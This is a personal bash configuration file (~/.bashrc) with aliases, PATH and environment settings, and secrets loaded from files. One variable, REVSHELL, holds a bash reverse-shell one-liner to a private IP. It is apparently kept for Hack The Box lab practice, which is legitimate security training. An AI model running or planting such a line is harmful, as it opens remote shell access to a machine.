#
# ~/.bashrc
#

# If not running interactively, don't do anything
[[ $- != *i* ]] && return

alias ls='ls --color=auto'
alias grep='grep --color=auto'
PS1='[\u@\h \W]\$ '

# Variables
export HISTFILESIZE=1000000
export HISTSIZE=1000000
export HISTCONTROL=ignoreboth:erasedups
export PATH="/home/oscar/.local/bin/:/home/oscar/.cargo/bin:$PATH"
export DF_DIRECTORY="${HOME}/Files/Builds/dotfiles"
export DOT_FILES="$HOME/.config/rofi:$HOME/.config/alacritty:$HOME/.config/ranger:$HOME/.bashrc:$HOME/.config/i3:$HOME/.config/polybar:$HOME/.config/dunst"
export REVSHELL="bash -i >& /dev/tcp/10.10.17.185/1234 0>&1"
export TERMINAL=gnome-terminal
export TERM=xterm-256color
export OPENAI_API_KEY=$(cat ~/.openai_api_key)
export HOME_ASSISTANT_TOKEN=$(cat ~/Mimisbrunnr/.secrets/ha_token)
export HOME_ASSISTANT_URL=$(cat ~/Mimisbrunnr/.secrets/ha_url)
export WINIT_X11_SCALE_FACTOR=1
export QT_SCALE_FACTOR=1.5
export EDITOR='emacsclient -t'

# Aliasses
alias fix="xset r rate 250 60 ; setxkbmap -option caps:escape ; setxkbmap -option compose:ralt"
alias update="paru -Syu"
alias xy="xclip -selection clipboard"
alias xp="xclip -o"
alias ns="notesearch"
alias fns="fnotesearch"
alias src="source bin/activate"
alias em='emacsclient -t'
alias vim='emacsclient -t'
#alias nano='emacsclient -t'
alias htbvpn='sudo openvpn /home/oscar/Mimisbrunnr/Projects/HTB/Dedicated_Lab_Protocol2.ovpn'
alias proj='cd ~/Mimisbrunnr/Projects'
alias mim='cd ~/Mimisbrunnr'
alias ccat='pygmentize -g'
alias builds='cd ~/Files/Builds'
alias eurupdate='rustyo eurobeat; paru -Syu; rustyo none'
alias rd='rolldice'
alias ai='openai-cli'
alias rfilm='ssh oscar@auga.mimisbrunnr.nl ls ~/Films | shuf | head -n 1'
alias rserie='ssh oscar@auga.mimisbrunnr.nl ls ~/Series | shuf | head -n 1'
alias wh='bluetoothctl connect AC:80:0A:E8:C0:F3'

virtenv() {
    python3 -m venv "$PWD"
    source "$PWD/bin/activate"
}

# Candy
export LESSOPEN="| /usr/bin/src-hilite-lesspipe.sh %s"
export LESS=' -R '
fortune ~/.config/home-manager/readwise.fortune | fold -s -w 50 | sed 's/^/\x1b[38;5;243m/;s/$/\x1b[0m/' && printf "\n"
